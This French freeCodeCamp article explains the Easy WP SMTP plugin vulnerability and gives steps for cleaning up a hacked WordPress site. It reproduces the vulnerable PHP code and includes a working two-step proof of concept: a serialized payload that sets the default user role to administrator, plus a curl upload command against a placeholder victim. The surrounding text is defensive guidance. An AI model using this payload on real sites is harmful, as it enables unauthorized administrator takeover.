---
title: Comment supprimer les redirections WordPress par des pirates — un regard sur
  la vulnérabilité du plugin Easy WP SMTP
subtitle: ''
author: freeCodeCamp
co_authors: []
series: null
date: '2019-03-29T09:20:05.000Z'
originalURL: https://freecodecamp.org/news/how-to-remove-the-wordpress-redirects-by-hackers-easy-wp-smtp-plugin-vulnerability-41dc56f9b3aa
coverImage: https://cdn-media-1.freecodecamp.org/images/1*SVmWJnlcDFFXomV7DfSQlA.jpeg
tags:
- name: plugins
  slug: plugins
- name: General Programming
  slug: programming
- name: Security
  slug: security
- name: 'tech '
  slug: tech
- name: WordPress
  slug: wordpress
seo_title: Comment supprimer les redirections WordPress par des pirates — un regard
  sur la vulnérabilité du plugin Easy WP SMTP
seo_desc: 'By Atman Rathod

  I believe you would be offended if you found your website redirecting to a spam
  website, wouldn’t you? Alas! And you would even feel more snubbed if you had taken
  every preventive measure for your WordPress website. True? In this digi...'
---

Par Atman Rathod

Je pense que vous seriez offensé si vous trouviez votre site web redirigeant vers un site de spam, n'est-ce pas ? Hélas ! Et vous vous sentiriez encore plus snobé si vous aviez pris toutes les mesures préventives pour votre [site WordPress](https://www.cmarix.com/website-monks-reveals-why-wordpress-is-best-cms-web-development/). Vrai ? Dans ce monde numérique, 30 000 sites web sont piratés quotidiennement et aujourd'hui pourrait être votre jour. Ainsi, il devient impératif de trouver une solution pour le jour de l'attaque.

Pour commencer, vous devez identifier comment l'attaquant a pu insérer du code malveillant afin que le site web redirige vers un site de phishing ou de malware et capte le trafic. Récemmment, lorsque nous avons été confrontés au même problème, nous avons découvert que le pirate avait obtenu l'accès via le plugin WP SMTP.

Le plugin bien connu Easy WP SMTP, qui compte 300 000 installations actives mensuelles, est sujet à une vulnérabilité zero-day. Il a donné des droits à un utilisateur inconnu d'accéder et de modifier les paramètres de WordPress.

> « Presque 30 % des sites web en ligne sont développés en WordPress, ce qui en fait le meilleur système de gestion de contenu. Cependant, si nous regardons l'ombre de la popularité, il devient alors le premier choix des pirates. »

Le plugin Easy WP SMTP gagne en popularité en raison de la [vulnérabilité zero-day (0-day)](https://en.wikipedia.org/wiki/Zero-day_(computing)) [révélée récemment](https://db.threatpress.com/vulnerability/easy-wp-smtp/wordpress-easy-wp-smtp-plugin-1-3-9-unauthenticated-arbitrary-wp-options-import-vulnerability). Le plugin, qui a un nombre élevé de téléchargements, a un taux de succès d'attaque encore plus élevé. Avant d'apprendre la solution, apprenons-en davantage sur ce plugin en détail.

#### **Vulnérabilité Zero-Day du Plugin Easy WP SMTP**

![Image](https://cdn-media-1.freecodecamp.org/images/pY8-qc6eryh0jep4vi0kDLmltRcaNBdhXIlc)

Easy WP SMTP a été créé pour faciliter le processus d'envoi d'e-mails depuis votre site WordPress. Il a même réussi son objectif d'envoyer des e-mails via SMTP au lieu de la fonction native [wp_mail()](https://developer.wordpress.org/reference/functions/wp_mail/).

Comme les autres plugins WordPress, le plugin Easy WP SMTP dispose de sa page d'administration qui vous permet de spécifier les données nécessaires à la configuration SMTP. En plus de cela, il y a une fonction pour importer et exporter les paramètres, et c'est là que le pirate peut facilement s'introduire.

Outre cela, il existe plusieurs autres vecteurs d'attaque qui permettent à l'attaquant d'accéder au niveau administrateur ou de provoquer une [fuite de données sensibles](https://blog.threatpress.com/check-sensitive-information-leakage/) comme les identifiants SMTP.

Considérez le code suivant :

```
add_action( 'admin_init', array( $this, 'admin_init' ) );......function admin_init() { if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) {   add_action( 'wp_ajax_swpsmtp_clear_log', array( $this, 'clear_log' ) );   add_action( 'wp_ajax_swpsmtp_self_destruct', array( $this, 'self_destruct_handler' ) ); }
```

```
//afficher le fichier de log if ( isset( $_GET[ 'swpsmtp_action' ] ) ) {     if ( $_GET[ 'swpsmtp_action' ] === 'view_log' ) {  $log_file_name = $this->opts[ 'smtp_settings' ][ 'log_file_name' ];  if ( ! file_exists( plugin_dir_path( __FILE__ ) . $log_file_name ) ) {      if ( $this->log( "Easy WP SMTP debug log file\r\n\r\n" ) === false ) {   wp_die( 'Can\'t write to log file. Check if plugin directory  (' . plugin_dir_path( __FILE__ ) . ') is writeable.' );      };  }  $logfile = fopen( plugin_dir_path( __FILE__ ) . $log_file_name, 'rb' );  if ( ! $logfile ) {      wp_die( 'Can\'t open log file.' );  }  header( 'Content-Type: text/plain' );  fpassthru( $logfile );  die;     } }
```

```
//vérifier si c'est une demande d'exportation des paramètres $is_export_settings = filter_input( INPUT_POST, 'swpsmtp_export_settings', FILTER_SANITIZE_NUMBER_INT ); if ( $is_export_settings ) {     $data      = array();     $opts      = get_option( 'swpsmtp_options', array() );     $data[ 'swpsmtp_options' ]   = $opts;     $swpsmtp_pass_encrypted    = get_option( 'swpsmtp_pass_encrypted', false );     $data[ 'swpsmtp_pass_encrypted' ]  = $swpsmtp_pass_encrypted;     if ( $swpsmtp_pass_encrypted ) {  $swpsmtp_enc_key   = get_option( 'swpsmtp_enc_key', false );  $data[ 'swpsmtp_enc_key' ]  = $swpsmtp_enc_key;     }     $smtp_test_mail    = get_option( 'smtp_test_mail', array() );     $data[ 'smtp_test_mail' ]  = $smtp_test_mail;     $out     = array();     $out[ 'data' ]    = serialize( $data );     $out[ 'ver' ]    = 1;     $out[ 'checksum' ]   = md5( $out[ 'data' ] );
```

```
$filename = 'easy_wp_smtp_settings.txt';     header( 'Content-Disposition: attachment; filename="' . $filename . '"' );     header( 'Content-Type: text/plain' );     echo serialize( $out );     exit; }
```

```
$is_import_settings = filter_input( INPUT_POST, 'swpsmtp_import_settings', FILTER_SANITIZE_NUMBER_INT ); if ( $is_import_settings ) {   $err_msg = __( 'Error occurred during settings import', 'easy-wp-smtp' );   if ( empty( $_FILES[ 'swpsmtp_import_settings_file' ] ) ) {   echo $err_msg;   wp_die();  }  $in_raw = file_get_contents( $_FILES[ 'swpsmtp_import_settings_file' ][ 'tmp_name' ] );  try {   $in = unserialize( $in_raw );   if ( empty( $in[ 'data' ] ) ) {     echo $err_msg;     wp_die();   }   if ( empty( $in[ 'checksum' ] ) ) {     echo $err_msg;     wp_die();   }   if ( md5( $in[ 'data' ] ) !== $in[ 'checksum' ] ) {     echo $err_msg;     wp_die();   }   $data = unserialize( $in[ 'data' ] );   foreach ( $data as $key => $value ) {     update_option( $key, $value );   }   set_transient( 'easy_wp_smtp_settings_import_success', true, 60 * 60 );   $url = admin_url() . 'options-general.php?page=swpsmtp_settings';   wp_safe_redirect( $url );   exit;  } catch ( Exception $ex ) {   echo $err_msg;   wp_die();  } }}
```

Lorsque l'utilisateur souhaite accéder à la zone d'administration, la fonction admin_init() dans le script easy-wp-smtp.php est appelée via le hook admin_init. Cela permet à l'administrateur de modifier chaque fonction, de l'ajout ou de la suppression du journal à l'importation ou à l'exportation de la configuration du plugin dans la base de données WordPress.

Lorsque vous appelez la fonction, elle ne vérifie pas les capacités de l'utilisateur et donc tout utilisateur connecté peut la déclencher. La limitation ici est qu'elle peut être mise en œuvre par tout utilisateur non authentifié, car Easy WP SMTP est construit en utilisant AJAX et le hook admin_init peut également être mis en œuvre sur admin-ajax.php comme décrit dans la documentation de l'API WordPress.

Ainsi, un utilisateur non authentifié peut facilement envoyer une requête AJAX, par exemple action=swpsmtp_clear_log, pour appeler la fonction ci-dessus et exécuter le code.

Par conséquent, pour protéger votre site web, nous vous recommandons de toujours mettre à jour le plugin Easy WP SMTP vers la [dernière version disponible](https://wordpress.org/plugins/easy-wp-smtp/).

#### **Notez la Preuve de Concept**

La preuve de concept suivante en deux étapes vous permet de créer un identifiant utilisateur où vous pouvez obtenir l'accès à l'administration et apporter les modifications pour supprimer le code malveillant. En bref, elle vous permet de prendre le contrôle complet du site web.

Ici, vous devez utiliser swpsmtp_import_settings afin de télécharger un fichier qui contient une charge utile sérialisée malveillante. Ce fichier aide l'utilisateur à s'enregistrer et à définir le rôle par défaut sur « administrateur » dans la base de données.

**1. Créez un fichier avec le nom « /tmp/upload.txt » et ajoutez ce contenu :**

```
a:2:{s:4:"data";s:81:"a:2:{s:18:"users_can_register";s:1:"1";s:12:"default_role";s:13:"administrator";}";s:8:"checksum";s:32:"3ce5fb6d7b1dbd6252f4b5b3526650c8";}
```

**2. Téléchargez le fichier :**

```
$ curl https://VICTIM.COM/wp-admin/admin-ajax.php -F 'action=swpsmtp_clear_log' -F 'swpsmtp_import_settings=1' -F 'swpsmtp_import_settings_file=@/tmp/upload.txt'
```

**Autres détails auxquels vous devez prêter attention :**

* Faites attention à l'exécution de code à distance via l'injection d'objets PHP, car Easy WP SMTP s'exécute en utilisant des appels unsafe unserialize().
* Marquez les différents journaux car le pirate peut changer le nom du fichier de journal.
* En exportant la configuration du plugin qui inclut l'hôte SMTP, le nom d'utilisateur et le mot de passe, le pirate peut l'utiliser pour envoyer des e-mails de spam.

#### **Étapes pour Supprimer les Redirections Malveillantes WordPress**

![Image](https://cdn-media-1.freecodecamp.org/images/emHZv0hE0Qgnu-arznDXKGFsDSxccoxKE98u)

* Changez les mots de passe et vérifiez les utilisateurs enregistrés
* Trouvez et supprimez les plugins et thèmes indésirables du site web
* Vérifiez complètement le site web avec les outils appropriés
* Trouvez le bon plugin WordPress pour analyser les fichiers de votre site web
* Vérifiez minutieusement tous les fichiers impactés
* Réinstallez vos fichiers WordPress, plugins et thèmes
* Soumettez à nouveau le site web à Google

#### **Autres Recommandations Importantes**

Si vous utilisez l'ancienne version du plugin Easy WP SMTP, vérifiez les éléments suivants :

* Vérifiez la page des paramètres et assurez-vous que rien n'est défectueux, de l'URL au rôle par défaut de l'utilisateur.
* Vérifiez les nouveaux comptes administrateur, les adresses e-mail et plus encore.
* Changez tous les mots de passe
* Changez également votre mot de passe SMTP, car les pirates peuvent maintenant avoir le mot de passe.
* Installez un pare-feu d'application web pour une meilleure sécurité.
* Assurez-vous de ne pas installer de plugins ou de thèmes inconnus
* Mettez à jour tous vos thèmes et plugins mensuellement
* Assurez-vous que l'installation de WordPress est régulièrement sauvegardée
* Si nécessaire, changez l'hébergeur web pour un qui offre une meilleure [sécurité WordPress](http://www.cmarix.com/how-to-optimize-security-of-wordpress-website/).